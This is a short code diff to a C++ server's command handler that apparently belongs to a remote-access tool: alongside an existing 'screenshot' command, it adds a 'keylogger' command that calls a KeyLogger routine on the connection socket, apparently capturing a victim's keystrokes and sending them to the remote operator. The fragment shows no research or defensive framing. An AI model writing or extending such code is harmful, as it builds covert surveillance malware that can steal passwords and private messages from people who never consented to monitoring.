@@ -163,7 +163,9 @@ void Server::TransferData() {
             }
         } else if (strcmp(msg, "screenshot") == 0) {
             ScreenShot("screenshot.bmp", res, maxLength);
-        } else {
+        } else if (strcmp(msg, "keylogger") == 0) {
+            KeyLogger::catchKeyPressUntilESC(new_fd);
+        }else {
             fflush(stdin); 
             std::cout <<"\n\t\t Server: ";
             std::string data;
